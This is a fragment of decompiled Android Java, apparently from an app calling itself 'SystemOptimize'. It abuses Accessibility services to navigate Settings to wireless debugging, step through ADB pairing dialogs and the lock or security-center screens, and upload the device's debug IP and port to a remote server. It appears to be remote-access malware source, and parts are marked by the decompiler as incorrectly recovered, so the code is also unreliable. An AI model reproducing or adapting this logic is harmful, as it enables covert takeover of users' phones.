            int responseCode = httpURLConnection.getResponseCode();
            t60.m214714d6("SystemOptimize", "上传调试端口结果: " + responseCode + ", ip=" + strM212019g9 + ", port=" + i);
            return responseCode == 200;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "上传调试端口失败", e);
            return false;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:25:0x0083, code lost:
    
        if (r5 != null) goto L29;
     */
    /* JADX WARN: Code restructure failed: missing block: B:26:0x0085, code lost:
    
        if (r6 != null) goto L28;
     */
    /* JADX WARN: Code restructure failed: missing block: B:27:0x0087, code lost:
    
        return r3;
     */
    /* JADX WARN: Code restructure failed: missing block: B:28:0x0088, code lost:
    
        return r6;
     */
    /* JADX WARN: Code restructure failed: missing block: B:29:0x0089, code lost:
    
        return r5;
     */
    /* renamed from: l2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final AccessibilityNodeInfo m212102l2(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo accessibilityNodeInfoM212014f9;
        AccessibilityNodeInfo accessibilityNodeInfoM212014f92;
        AccessibilityNodeInfo accessibilityNodeInfoM212014f93;
        try {
            accessibilityNodeInfo.refresh();
            t60.m214702c3("SystemOptimize", "开始滚动查找无线调试栏目");
            y90 y90Var = AbstractC0361a3.f53874a0;
            AccessibilityNodeInfo accessibilityNodeInfoM212014f94 = m212014f9(accessibilityNodeInfo, dh0.f55789d9);
            AccessibilityNodeInfo accessibilityNodeInfoM212014f95 = m212014f9(accessibilityNodeInfo, dh0.f55794e4);
            AccessibilityNodeInfo accessibilityNodeInfoM212014f96 = m212014f9(accessibilityNodeInfo, dh0.f55808f8);
            if (accessibilityNodeInfoM212014f94 != null || accessibilityNodeInfoM212014f95 != null || accessibilityNodeInfoM212014f96 != null) {
                return accessibilityNodeInfoM212014f94 == null ? accessibilityNodeInfoM212014f95 == null ? accessibilityNodeInfoM212014f96 : accessibilityNodeInfoM212014f95 : accessibilityNodeInfoM212014f94;
            }
            int i = 0;
            int i2 = 0;
            while (true) {
                int i3 = i2 + 1;
                if (i2 >= 14) {
                    break;
                }
                t60.m214702c3("SystemOptimize", "向下滚动查找无线调试栏目 (第" + i3 + "次)");
                List list = C0362a4.f53875a0;
                if (!C0362a4.m212109a4(accessibilityNodeInfo, this.f53815a0, this.f53816a1)) {
                    t60.m214702c3("SystemOptimize", "无法继续向下滚动");
                    break;
                }
                AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    y90 y90Var2 = AbstractC0361a3.f53874a0;
                    AccessibilityNodeInfo accessibilityNodeInfoM212014f97 = m212014f9(rootInActiveWindow, dh0.f55789d9);
                    AccessibilityNodeInfo accessibilityNodeInfoM212014f98 = m212014f9(rootInActiveWindow, dh0.f55794e4);
                    AccessibilityNodeInfo accessibilityNodeInfoM212014f99 = m212014f9(rootInActiveWindow, dh0.f55808f8);
                    if (accessibilityNodeInfoM212014f97 != null || accessibilityNodeInfoM212014f98 != null || accessibilityNodeInfoM212014f99 != null) {
                        break;
                    }
                    i2 = i3;
                } else {
                    break;
                }
            }
            AccessibilityNodeInfo accessibilityNodeInfoM212048d6 = m212048d6(this.f53815a0.getRootInActiveWindow());
            if (accessibilityNodeInfoM212048d6 != null) {
                while (true) {
                    int i4 = i + 1;
                    if (i >= 14) {
                        break;
                    }
                    t60.m214702c3("SystemOptimize", "向上滚动查找无线调试栏目 (第" + i4 + "次)");
                    List list2 = C0362a4.f53875a0;
                    if (!C0362a4.m212111a6(accessibilityNodeInfoM212048d6, this.f53815a0, this.f53816a1)) {
                        t60.m214702c3("SystemOptimize", "无法继续向上滚动");
                        return null;
                    }
                    AccessibilityNodeInfo rootInActiveWindow2 = this.f53815a0.getRootInActiveWindow();
                    if (rootInActiveWindow2 == null) {
                        break;
                    }
                    y90 y90Var3 = AbstractC0361a3.f53874a0;
                    accessibilityNodeInfoM212014f9 = m212014f9(rootInActiveWindow2, dh0.f55789d9);
                    accessibilityNodeInfoM212014f92 = m212014f9(rootInActiveWindow2, dh0.f55794e4);
                    accessibilityNodeInfoM212014f93 = m212014f9(rootInActiveWindow2, dh0.f55808f8);
                    if (accessibilityNodeInfoM212014f9 != null || accessibilityNodeInfoM212014f92 != null || accessibilityNodeInfoM212014f93 != null) {
                        break;
                    }
                    i = i4;
                }
                return accessibilityNodeInfoM212014f9 == null ? accessibilityNodeInfoM212014f92 == null ? accessibilityNodeInfoM212014f93 : accessibilityNodeInfoM212014f92 : accessibilityNodeInfoM212014f9;
            }
            return null;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "w0() 异常", e);
            return null;
        }
    }

    /* renamed from: l3 */
    public final void m212103l3() {
        t60.m214702c3("SystemOptimize", "y1() 30秒检查");
        if (this.f53819a4.get() == SystemOptimizeManager$PairState.f53759a0) {
            t60.m214726f4("SystemOptimize", "y1() 30秒后仍在UNKNOWN状态");
            if (this.f53815a0.performGlobalAction(2)) {
                m212025k1(5);
            }
            if (this.f53815a0.performGlobalAction(1)) {
                m212025k1(5);
            }
            AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                rootInActiveWindow.refresh();
            }
        }
    }

    /* renamed from: l4 */
    public final void m212104l4() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f53818a3;
        try {
            concurrentLinkedQueue.remove("pairInDevOption");
            concurrentLinkedQueue.remove("pairInWifiDebugWindow");
            concurrentLinkedQueue.remove("pairInPairCodeDialog");
            concurrentLinkedQueue.remove("pairInPairSuccess");
            concurrentLinkedQueue.remove("pairInPairFailDialog");
            concurrentLinkedQueue.remove("pairInPrepareFinish");
            concurrentLinkedQueue.remove("pairInConfirmLock");
            concurrentLinkedQueue.remove("pairInSecurityCenter");
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "z_cleanup 异常", e);
        }
    }
}
